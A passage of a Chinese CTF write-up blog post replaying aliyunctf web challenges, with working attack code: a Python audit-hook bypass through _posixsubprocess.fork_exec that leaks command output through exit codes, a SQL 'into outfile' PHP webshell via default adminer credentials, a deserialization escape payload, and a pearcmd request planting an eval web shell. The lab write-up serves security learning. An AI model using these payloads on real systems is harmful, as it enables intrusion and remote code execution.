data-num="170"></td><td><pre></pre></td></tr><tr><td data-num="171"></td><td><pre></pre></td></tr><tr><td data-num="172"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="173"></td><td><pre>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>oj 判题系统，后端用过 audithook 限制代码的行为，只允许某些特定的时间（import，time.sleep,builtins.input）执行</p>
+<p>python 代码中，会执行我提交的代码，上文限制了代码的行为（os,subprocess 等）或者执行不允许的系统调用（如 input () 都会抛出错误）</p>
+<p>这题不回显，不出网，利用 oj 系统的一个特性：</p>
+<h5 id="oj-系统将命令执行的输出回显为退出码攻击者可以通过获取退出码的信息来提取子进程的输出进一步分析和获取系统信息"><a class="anchor" href="#oj-系统将命令执行的输出回显为退出码攻击者可以通过获取退出码的信息来提取子进程的输出进一步分析和获取系统信息">#</a> OJ 系统将命令执行的输出回显为退出码，攻击者可以通过获取退出码的信息来提取子进程的输出，进一步分析和获取系统信息。</h5>
+<p>这样就可以用 fork_exec () 用于执行命令并将标准输出重定向到管道，从而能够将命令的输出回传给父进程。通过这种方式，子进程执行的命令输出就可以通过推出吗的形式返回</p>
+<ol>
+<li>
+<p><strong>导入模块</strong>：</p>
+<pre><code>python复制编辑import os
+import time
+import sys
+</code></pre>
+<ul>
+<li><code>os</code> ：用于操作系统相关的功能，如管道和文件操作。</li>
+<li><code>time</code> ：用于控制程序的执行时间，这里用来确保子进程执行完成。</li>
+<li><code>sys</code> ：用于处理程序的退出码。</li>
+</ul>
+</li>
+<li>
+<p><strong>动态导入  <code>_posixsubprocess</code> </strong>：</p>
+<pre><code>python
+
+
+复制编辑
+exec('import _posixsubprocess')
+</code></pre>
+<ul>
+<li>通过  <code>exec</code>  动态导入  <code>_posixsubprocess</code>  模块，绕过了审计钩子的限制。正常情况下， <code>import</code>  会被审计拦截，但  <code>exec</code>  可以用来执行任意代码，允许动态导入模块。</li>
+</ul>
+</li>
+<li>
+<p><strong>创建管道</strong>：</p>
+<pre><code>python复制编辑std_pipe = os.pipe()
+err_pipe = os.pipe()
+</code></pre>
+<ul>
+<li><code>os.pipe()</code>  创建一个管道，返回一对文件描述符，分别用于读取（ <code>std_pipe[0]</code> ）和写入（ <code>std_pipe[1]</code> ）数据。</li>
+<li>通过管道，我们可以将命令的输出从子进程传递给父进程。</li>
+</ul>
+</li>
+<li>
+<p><strong>执行命令</strong>：</p>
+<pre><code>python复制编辑_posixsubprocess.fork_exec(
+    (b&quot;/bin/bash&quot;, b&quot;-c&quot;, b&quot;ls /&quot;),  # 命令
+    [b&quot;/bin/bash&quot;],
+    True,
+    (),
+    None,
+    None,
+    -1,
+    -1,
+    -1,
+    std_pipe[1],  # c2pwrite
+    -1,
+    -1,
+    *(err_pipe),
+    False,
+    False,
+    False,
+    None,
+    None,
+    None,
+    -1,
+    None,
+    False,
+)
+</code></pre>
+<ul>
+<li><code>_posixsubprocess.fork_exec()</code>  用于执行指定的命令（在此示例中是  <code>ls /</code> ）。它会创建一个新的进程，并执行该命令。</li>
+<li>关键参数：
+<ul>
+<li><code>(b&quot;/bin/bash&quot;, b&quot;-c&quot;, b&quot;ls /&quot;)</code> ：表示要执行的命令，这里是通过  <code>bash</code>  执行  <code>ls /</code>  命令。</li>
+<li><code>std_pipe[1]</code> ：指定命令的标准输出会重定向到  <code>std_pipe</code> ，即命令的输出会写入管道。</li>
+<li><code>err_pipe</code> ：标准错误输出也重定向到另一个管道，但这段代码并没有使用它。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>确保子进程执行完成</strong>：</p>
+<pre><code>python
+
+
+复制编辑
+time.sleep(0.1)
+</code></pre>
+<ul>
+<li>程序在这里暂停 0.1 秒，确保子进程执行完成并且输出被写入到管道中。因为管道是异步操作，所以我们需要稍等片刻，保证数据已经被完全写入。</li>
+</ul>
+</li>
+<li>
+<p><strong>读取管道中的输出</strong>：</p>
+<pre><code>python复制编辑content = os.read(std_pipe[0], 1024)
+content_len = len(content)
+</code></pre>
+<ul>
+<li><code>os.read(std_pipe[0], 1024)</code>  读取管道中的内容。 <code>std_pipe[0]</code>  是管道的读取端。</li>
+<li><code>1024</code>  是读取的字节数。根据命令的输出内容大小，你可能需要调整这个值。</li>
+<li><code>content_len</code>  存储管道中内容的长度。</li>
+</ul>
+</li>
+<li>
+<p><strong>根据输出位置返回字符</strong>：</p>
+<pre><code>python复制编辑if &#123;loc&#125; &lt; content_len:
+    sys.exit(content[&#123;loc&#125;])  # 退出码为读取到的字符
+else:
+    sys.exit(255)  # 如果没有数据，则返回 255
+</code></pre>
+<ul>
+<li><code>&#123;loc&#125;</code>  是一个占位符，表示我们要读取命令输出中的某个位置的字符。</li>
+<li>如果读取到的内容长度大于  <code>&#123;loc&#125;</code> ，那么返回该位置的字符作为退出码（ <code>sys.exit(content[&#123;loc&#125;])</code> ）。</li>
+<li>如果读取到的内容不足  <code>&#123;loc&#125;</code> ，则返回  <code>255</code> ，表示没有更多数据。</li>
+</ul>
+</li>
+</ol>
+<h4 id="提交请求部分"><a class="anchor" href="#提交请求部分">#</a> 提交请求部分</h4>
+<pre><code>python复制编辑command = &quot;ls /&quot;  # 你可以修改命令，比如 'cat /flag' 或其他
+received = &quot;&quot;
+
+for i in range(254):
+    code = CODE_TEMPLATE.format(loc=i, command=command)  # 格式化代码模板
+    data = &#123;&quot;problem_id&quot;: 0, &quot;code&quot;: code&#125;  # 请求数据
+    resp = requests.post(URL, json=data)  # 提交请求
+    resp_data = resp.json()
+    
+    # 确保程序返回运行时错误
+    assert(resp_data[&quot;status&quot;] == &quot;RE&quot;)
+    
+    # 查找退出码位置
+    ret_loc = resp_data[&quot;message&quot;].find(&quot;ret=&quot;)
+    ret_code = resp_data[&quot;message&quot;][ret_loc + 4:]
+
+    if ret_code == &quot;255&quot;:  # 255 表示没有更多数据
+        break
+    
+    # 将返回的退出码转换为字符并拼接
+    received += chr(int(ret_code))
+    print(received)
+</code></pre>
+<ol>
+<li>
+<p><strong>命令设置</strong>：</p>
+<pre><code>python
+
+
+复制编辑
+command = &quot;ls /&quot;  # 你可以修改命令，比如 'cat /flag' 或其他
+</code></pre>
+<ul>
+<li>这里  <code>command</code>  设置为  <code>ls /</code> ，你可以修改为  <code>cat /flag</code>  或其他命令，来获取你想要的信息（比如 flag）。</li>
+</ul>
+</li>
+<li>
+<p><strong>请求循环</strong>：</p>
+<pre><code>python复制编辑for i in range(254):
+    code = CODE_TEMPLATE.format(loc=i, command=command)  # 格式化代码模板
+    data = &#123;&quot;problem_id&quot;: 0, &quot;code&quot;: code&#125;  # 请求数据
+    resp = requests.post(URL, json=data)  # 提交请求
+    resp_data = resp.json()
+</code></pre>
+<ul>
+<li>通过循环从位置  <code>i = 0</code>  到  <code>i = 253</code>  提交代码， <code>loc=i</code>  表示我们每次从命令输出中读取不同位置的字符。</li>
+<li><code>data</code>  包含要提交的代码和问题 ID， <code>requests.post()</code>  用来将代码提交给 OJ 系统。</li>
+</ul>
+</li>
+<li>
+<p><strong>处理返回的响应</strong>：</p>
+<pre><code>python
+
+
+复制编辑
+assert(resp_data[&quot;status&quot;] == &quot;RE&quot;)
+</code></pre>
+<ul>
+<li>确保 OJ 系统返回的是运行时错误（ <code>RE</code> ），意味着程序执行没有通过审计，且输出通过退出码返回。</li>
+</ul>
+</li>
+<li>
+<p><strong>查找退出码</strong>：</p>
+<pre><code>python复制编辑ret_loc = resp_data[&quot;message&quot;].find(&quot;ret=&quot;)
+ret_code = resp_data[&quot;message&quot;][ret_loc + 4:]
+</code></pre>
+<ul>
+<li>查找返回消息中的  <code>ret=</code>  字符串，从中提取出实际的退出码。</li>
+</ul>
+</li>
+<li>
+<p><strong>停止条件</strong>：</p>
+<pre><code>python复制编辑if ret_code == &quot;255&quot;:  # 255 表示没有更多数据
+    break
+</code></pre>
+<ul>
+<li>如果返回的退出码是  <code>255</code> ，表示没有更多数据，结束循环。</li>
+</ul>
+</li>
+<li>
+<p><strong>拼接输出并打印</strong>：</p>
+<pre><code>python复制编辑received += chr(int(ret_code))
+print(received)
+</code></pre>
+<ul>
+<li>将每次获取的字符拼接到  <code>received</code>  变量中，并打印已拼接的输出。</li>
+</ul>
+</li>
+</ol>
+<h3 id="打卡ok"><a class="anchor" href="#打卡ok">#</a> 打卡 ok：</h3>
+<h4 id="非预期"><a class="anchor" href="#非预期">#</a> 非预期：</h4>
+<p>～泄漏，发现 adminer_481.php，登陆后修改用户密码登陆</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251921467.png" alt="image-20250225192122313" /></p>
+<p>默认用户密码登录：root;root</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251922483.png" alt="image-20250225192225138" /></p>
+<p>可以有 SQL 命令执行</p>
+<p>可以用命令写入 web 网站里面</p>
+<pre><code>select &quot;1111&lt;?php $a='cat /Ali_t1hs_1sflag_2025';system($a);?&gt;&quot; into outfile &quot;/var/www/html/shell3.php&quot;;
+</code></pre>
+<p>可以修改 $a 的值</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251923837.png" alt="image-20250225192346787" /></p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251923643.png" alt="image-20250225192355442" /></p>
+<h4 id="预期"><a class="anchor" href="#预期">#</a> 预期：</h4>
+<p>（没给源码怎么进行代码审计呢）</p>
+<p>审计代码，利用绕过 date 函数反序列化逃逸</p>
+<pre><code>POST /index.php?debug_buka=%5c%31%5c%32%5c%33%5c%78%5c%78%5c%78%5c%78%5c%22%5c%3b%5c%73%5c%3a%5c%34%5c%3a%5c%22%5c%74%5c%69%5c%6d%5c%65%5c%22%5c%3b%5c%73%5c%3a%5c%32%5c%3a%5c%22%5c%31%5c%32%5c%22%5c%3b%5c%73%5c%3a%5c%31%5c%30%5c%3a%5c%22%5c%62%5c%61%5c%63%5c%6b%5c%67%5c%72%5c%6f%5c%75%5c%6e%5c%64%5c%22%5c%3b%5c%73%5c%3a%5c%34%5c%33%5c%3a%5c%22%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%75%5c%73%5c%72%5c%2f%5c%6c%5c%6f%5c%63%5c%61%5c%6c%5c%2f%5c%6c%5c%69%5c%62%5c%2f%5c%70%5c%68%5c%70%5c%2f%5c%70%5c%65%5c%61%5c%72%5c%63%5c%6d%5c%64%22%5c%3b%5c%7d HTTP/1.1
+
+Host: 192.168.10.100:50100
+
+Content-Length: 53
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+Origin: http://192.168.10.100:50100
+
+Content-Type: application/x-www-form-urlencoded
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: zh-CN,zh;q=0.9
+
+Cookie: PHPSESSID=fpd8m225h699b4o6stpja3vtcc; adminer_version=4.8.1
+
+x-forwarded-for: localhost
+
+Connection: close
+
+reason=%3C%3Fphp+exit%3B%2F%2F%3C%3Fphp+exit%3B%2F%2F
+</code></pre>
+<p>然后 pearcmd 即可</p>
+<pre><code>POST /index.php?check&amp;+config-create+/&lt;?=@eval($_GET[1]);?&gt;+/var/www/html/hello.php HTTP/1.1
+
+Host: 172.16.2.72:5898
+
+Content-Length: 7
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+Origin: http://172.16.2.72:5398
+
+Content-Type: application/x-www-form-urlencoded
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Referer: http://172.16.2.72:5398/index.php?check/?+config-create+/%3C?=phpinfo()?%3E+/var/www/html/hello.php
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: zh-CN,zh;q=0.9
+
+Cookie: PHPSESSID=inns5m7uhe0i3d9d19dtgcmsj2; adminer_version=4.8.1
+
+x-forwarded-for: localhost
+
+Connection: close
+
+check=1
+</code></pre>
+<p>这个 pearcmd 挺难写进去的</p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+          <a href="/tags/regexp%E6%B3%A8%E5%85%A5/" rel="tag"><i class="ic i-tag"></i> regexp注入</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2025-02-25 20:10:20" itemprop="dateModified" datetime="2025-02-25T20:10:20+08:00">2025-02-25</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="aliyunctf部分复现">http://odiws.github.io/2025/02/25/aliyunctf部分复现/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?80357" title="java反序列化学习笔记">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 学习笔记</span>
+  <h3>java反序列化学习笔记</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2025/02/26/HMGCTF2022-Fan-Website/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?94963" title="[HMGCTF2022]Fan_Website">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[HMGCTF2022]Fan_Website</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezoj"><span class="toc-number">1.</span> <span class="toc-text"> ezoj：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#oj-%E7%B3%BB%E7%BB%9F%E5%B0%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E8%BE%93%E5%87%BA%E5%9B%9E%E6%98%BE%E4%B8%BA%E9%80%80%E5%87%BA%E7%A0%81%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%8E%B7%E5%8F%96%E9%80%80%E5%87%BA%E7%A0%81%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9D%A5%E6%8F%90%E5%8F%96%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%BE%93%E5%87%BA%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90%E5%92%8C%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.1.</span> <span class="toc-text"> OJ 系统将命令执行的输出回显为退出码，攻击者可以通过获取退出码的信息来提取子进程的输出，进一步分析和获取系统信息。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E8%AF%B7%E6%B1%82%E9%83%A8%E5%88%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 提交请求部分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8D%A1ok"><span class="toc-number">2.</span> <span class="toc-text"> 打卡 ok：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.</span> <span class="toc-text"> 非预期：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">2.2.</span> <span class="toc-text"> 预期：</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="aliyunctf部分复现">aliyunctf部分复现</a></li><li><a href="/2025/03/25/Nctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="Nctf_web部分复现">Nctf_web部分复现</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">44</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">9</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">36</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/07/28/2019-SVGMagic/" title="[BSidesCF2019]SVGMagic">[BSidesCF2019]SVGMagic</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java反序列化学习笔记">java反序列化学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/" title="[SWPU2019]伟大的侦探">[SWPU2019]伟大的侦探</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/02/PyCalX-1/" title="PyCalX_1">PyCalX_1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/misc/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/10/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/" title="[BJDCTF2020]一叶障目">[BJDCTF2020]一叶障目</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/misc/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/10/%E8%8F%9C%E5%88%80666/" title="菜刀666">菜刀666</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2025/02/25/aliyunctf部分复现/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
